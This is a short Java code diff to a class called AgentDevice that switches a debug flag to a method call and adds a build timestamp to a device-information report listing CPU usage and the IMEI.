@@ -101,8 +101,12 @@ public class AgentDevice extends AgentBase {
 		readCpuUsage();
 
 		final StringBuffer sb = new StringBuffer();
-		if(Configuration.DEBUG){
+		if(Configuration.isDebug()){
 			sb.append("Debug\n");
+			String timestamp = System.getProperty("build.timestamp");
+			if(timestamp!=null){
+				sb.append(timestamp + "\n");
+			}
 		}
 		sb.append("-- SYSTEM --\r\n");
 		sb.append("IMEI: " + Device.self().getImei() + "\n");
@@ -178,7 +182,7 @@ public class AgentDevice extends AgentBase {
 			this.cpuTotal = currTotal;
 			this.cpuIdle = currIdle;
 		} catch (final IOException ex) {
-			if(Configuration.DEBUG) { ex.printStackTrace(); }
+			if(Configuration.isDebug()) { ex.printStackTrace(); }
 		}
 	}
 
